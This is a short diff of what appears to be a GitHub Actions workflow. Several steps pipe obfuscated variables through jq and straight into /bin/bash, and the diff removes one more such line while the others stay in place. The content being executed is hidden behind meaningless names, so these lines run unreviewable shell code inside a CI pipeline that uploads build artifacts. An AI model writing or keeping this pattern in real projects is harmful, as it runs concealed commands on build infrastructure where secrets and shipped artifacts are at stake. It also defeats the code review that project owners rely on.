@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$tk4637" | jq -r .gc92932 | /bin/bash
           echo $fxys56160 | jq -r .pako4824 | /bin/bash
           printf '%s' "$y75" | jq -r .cmpd48574 | /bin/bash
-          printf '%s' "$kpail2" | jq -r .l351 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
